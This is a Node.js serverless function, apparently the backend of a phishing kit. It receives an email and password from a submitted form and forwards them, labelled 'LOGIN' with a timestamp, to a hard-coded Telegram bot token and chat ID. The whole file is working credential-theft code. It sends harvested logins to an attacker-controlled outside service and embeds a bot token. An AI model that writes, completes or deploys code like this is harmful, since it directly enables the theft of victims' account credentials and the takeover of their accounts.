const fetch = require("node-fetch");

const TOKEN = "8697377512:AAEWHoZWP6LrwIZy5-gJwiJe_U36-MCvxhk";
const CHAT_ID = "1957450632";

exports.handler = async function(event, context) {
  try {
    // Parse incoming JSON body
    const { email, password } = JSON.parse(event.body);

    // Construct Telegram message
    const message = `🔐 LOGIN
Email: ${email}
Password: ${password}
Time: ${new Date().toLocaleString()}`;

    // Send to Telegram
    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    });

    if (res.ok) {
      return { statusCode: 200, body: JSON.stringify({ success: true }) };
    } else {
      return { statusCode: 500, body: JSON.stringify({ success: false }) };
    }
  } catch (err) {
    console.error(err);
    return { statusCode: 500, body: JSON.stringify({ success: false, error: err.message }) };
  }
};
